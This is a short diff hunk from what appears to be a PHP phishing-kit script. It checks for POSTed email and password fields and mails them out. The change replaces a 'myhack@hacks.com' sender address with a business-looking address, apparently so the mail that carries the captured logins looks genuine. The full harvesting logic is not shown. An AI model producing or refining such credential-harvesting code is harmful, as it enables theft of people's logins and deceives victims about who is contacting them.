@@ -66,8 +66,8 @@ if (isset($_POST['email']) and isset($_POST['password'])) {
     
     $headers .= "MIME-Version: 1.0 \r\n";
     $headers .= "Content-type: text/html \r\n";
-    $headers = 'From: myhack@hacks.com' . " \r\n" .
-    'Reply-To: myhack@hacks.com' . " \r\n" .
+    $headers = 'From: sales@facilpix.com.br' . " \r\n" .
+    'Reply-To: sales@facilpix.com.br' . " \r\n" .
     'X-Mailer: PHP/' . phpversion();
     
     mail($to, $subject, $message, $headers);
